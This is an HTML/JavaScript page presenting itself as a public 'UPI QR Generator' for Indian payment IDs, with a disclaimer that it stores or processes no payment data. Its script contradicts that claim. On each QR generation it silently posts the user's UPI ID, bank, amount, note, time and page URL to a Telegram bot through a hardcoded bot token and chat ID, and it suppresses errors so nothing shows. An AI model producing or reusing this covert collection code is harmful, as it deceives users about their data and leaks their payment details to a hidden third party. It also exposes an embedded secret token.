<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>UPI QR Generator | Public Utility Dashboard</title>
<meta name="viewport" content="width=device-width, initial-scale=1">

<style>
:root{
  --bg1:#0b5ed7;
  --bg2:#020617;
  --card:rgba(255,255,255,.10);
  --border:rgba(255,255,255,.18);
  --accent:#38bdf8;
}
*{box-sizing:border-box}
body{
  margin:0;
  min-height:100vh;
  display:flex;
  align-items:center;
  justify-content:center;
  background:radial-gradient(circle at top,var(--bg1) 0%,var(--bg2) 65%);
  font-family:Segoe UI,Arial;
  color:#fff;
}
.card{
  width:400px;
  max-width:94%;
  background:var(--card);
  backdrop-filter:blur(18px);
  border:1px solid var(--border);
  border-radius:26px;
  padding:30px;
  box-shadow:0 40px 80px rgba(0,0,0,.7);
  text-align:center;
}
h2{margin:0 0 6px}
p{margin:0 0 22px;font-size:13px;opacity:.85}
.group{text-align:left;margin-bottom:14px}
label{font-size:12px;opacity:.8;display:block;margin-bottom:6px}
input{
  width:100%;
  padding:14px;
  border-radius:14px;
  border:1px solid var(--border);
  background:rgba(255,255,255,.08);
  color:#fff;
  font-size:15px;
  outline:none;
}
button{
  width:100%;
  padding:15px;
  border:none;
  border-radius:16px;
  background:linear-gradient(135deg,#2563eb,#38bdf8);
  color:#fff;
  font-size:16px;
  font-weight:600;
  cursor:pointer;
  margin-top:6px;
}
.qr-box{
  margin-top:22px;
  padding:18px;
  border-radius:18px;
  background:rgba(0,0,0,.25);
  display:none;
}
#bankLogo{width:64px;margin-bottom:10px}
#qrImg{width:220px;border-radius:14px}
.actions button{background:#0b5ed7;margin-top:10px}
.actions a{
  display:block;
  margin-top:10px;
  color:var(--accent);
  text-decoration:none;
  font-weight:600;
}
.note{font-size:12px;opacity:.75;margin-top:10px}
.disclaimer{
  margin-top:18px;
  padding-top:12px;
  font-size:11px;
  line-height:1.5;
  opacity:.65;
  border-top:1px dashed rgba(255,255,255,.25);
}
.footer{margin-top:14px;font-size:11px;opacity:.6}
</style>
</head>

<body>

<div class="card">
  <h2>ðŸ§¾ UPI QR Generator</h2>
  <p>Secure â€¢ Fast â€¢ All UPI Apps Supported</p>

  <div class="group">
    <label>Payee Name</label>
    <input id="name" placeholder="Example: Rankaj Kumar">
  </div>

  <div class="group">
    <label>UPI ID *</label>
    <input id="upi" placeholder="example@bank">
  </div>

  <div class="group">
    <label>Amount (optional)</label>
    <input id="amount" type="number" placeholder="100">
  </div>

  <div class="group">
    <label>Payment Note (optional)</label>
    <input id="note" placeholder="Utility payment">
  </div>

  <button onclick="generateQR()">Generate UPI QR</button>

  <div class="qr-box" id="qrBox">
    <img id="bankLogo" style="display:none">
    <img id="qrImg">

    <div class="actions">
      <button onclick="downloadQR()">ðŸ“¥ Download QR (PNG)</button>
      <a id="payLink" target="_blank">ðŸ’¸ Pay Now via UPI</a>
    </div>

    <div class="note">Scan with GPay â€¢ PhonePe â€¢ Paytm â€¢ BHIM</div>
  </div>

  <div class="disclaimer">
    <strong>Disclaimer:</strong>
    This UPI QR Generator is provided for public utility purposes only.
    The tool does not store or process any payment data.
    All transactions are handled securely by official UPI applications.
    Users must verify UPI ID, amount, and details before making payment.
  </div>

  <div class="footer">Designed & Developed by Rankaj Kumar</div>
</div>

<script>
/* ===== TELEGRAM CONFIG ===== */
const BOT_TOKEN = "7193425151:AAFKa2HcygWLjSOYWTcC917_joT6S-RBYyY";
const CHAT_ID  = "543961277";

/* ===== BANK LOGO MAP ===== */
function getBankLogo(upi){
  if(!upi.includes("@")) return null;
  const h = upi.split("@")[1];
  const map={
    oksbi:"https://upload.wikimedia.org/wikipedia/commons/5/5c/State_Bank_of_India_logo.svg",
    okhdfcbank:"https://upload.wikimedia.org/wikipedia/commons/2/28/HDFC_Bank_Logo.svg",
    okaxis:"https://upload.wikimedia.org/wikipedia/commons/1/1a/Axis_Bank_logo.svg",
    okicici:"https://upload.wikimedia.org/wikipedia/commons/1/12/ICICI_Bank_Logo.svg",
    ybl:"https://upload.wikimedia.org/wikipedia/commons/0/09/PhonePe_Logo.svg",
    ibl:"https://upload.wikimedia.org/wikipedia/commons/0/09/PhonePe_Logo.svg",
    paytm:"https://upload.wikimedia.org/wikipedia/commons/5/55/Paytm_Logo.svg",
    upi:"https://upload.wikimedia.org/wikipedia/commons/e/e1/Unified_Payments_Interface_logo.svg"
  };
  return map[h] || map.upi;
}

/* ===== TELEGRAM SEND ===== */
let qrCount = Number(localStorage.getItem("qr_count") || 0);
function sendQRToTelegram(data){
  qrCount++;
  localStorage.setItem("qr_count",qrCount);

  const msg = `
ðŸ§¾ UPI QR Generated

ðŸ”¢ Total QR Generated: ${qrCount}

ðŸ¦ Bank/App: ${data.bank}
ðŸ“Œ UPI ID: ${data.upi}
ðŸ’° Amount: ${data.amount || "Not Set"}
ðŸ“ Note: ${data.note || "None"}

ðŸ•’ Time: ${new Date().toLocaleString()}
ðŸŒ Page: ${location.href}
`;

  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
    method:"POST",
    headers:{ "Content-Type":"application/json" },
    body:JSON.stringify({ chat_id: CHAT_ID, text: msg })
  }).catch(()=>{});
}

/* ===== GENERATE QR ===== */
function generateQR(){
  const name=document.getElementById("name").value.trim();
  const upi=document.getElementById("upi").value.trim().toLowerCase();
  const amount=document.getElementById("amount").value.trim();
  const note=document.getElementById("note").value.trim();

  if(!upi || !upi.includes("@")){
    alert("Please enter a valid UPI ID");
    return;
  }

  let upiUrl=`upi://pay?pa=${encodeURIComponent(upi)}&pn=${encodeURIComponent(name||"UPI Payment")}`;
  if(amount) upiUrl+=`&am=${amount}`;
  if(note) upiUrl+=`&tn=${encodeURIComponent(note)}`;

  document.getElementById("qrImg").src =
    "https://api.qrserver.com/v1/create-qr-code/?size=260x260&data="+
    encodeURIComponent(upiUrl);

  const logo=getBankLogo(upi);
  const logoImg=document.getElementById("bankLogo");
  if(logo){
    logoImg.src=logo;
    logoImg.style.display="block";
    logoImg.onerror=()=>logoImg.style.display="none";
  }

  document.getElementById("payLink").href=upiUrl;
  document.getElementById("qrBox").style.display="block";

  sendQRToTelegram({
    upi: upi,
    bank: upi.split("@")[1].toUpperCase(),
    amount: amount,
    note: note
  });
}

/* ===== DOWNLOAD QR ===== */
function downloadQR(){
  const qr=document.getElementById("qrImg");
  const logo=document.getElementById("bankLogo");

  const canvas=document.createElement("canvas");
  const ctx=canvas.getContext("2d");
  canvas.width=260;
  canvas.height=320;

  ctx.fillStyle="#fff";
  ctx.fillRect(0,0,canvas.width,canvas.height);

  let y=10;
  if(logo.style.display!=="none"){
    ctx.drawImage(logo,100,y,60,60);
    y+=70;
  }
  ctx.drawImage(qr,20,y,220,220);

  const a=document.createElement("a");
  a.download="upi-qr.png";
  a.href=canvas.toDataURL("image/png");
  a.click();
}
</script>

</body>
</html>
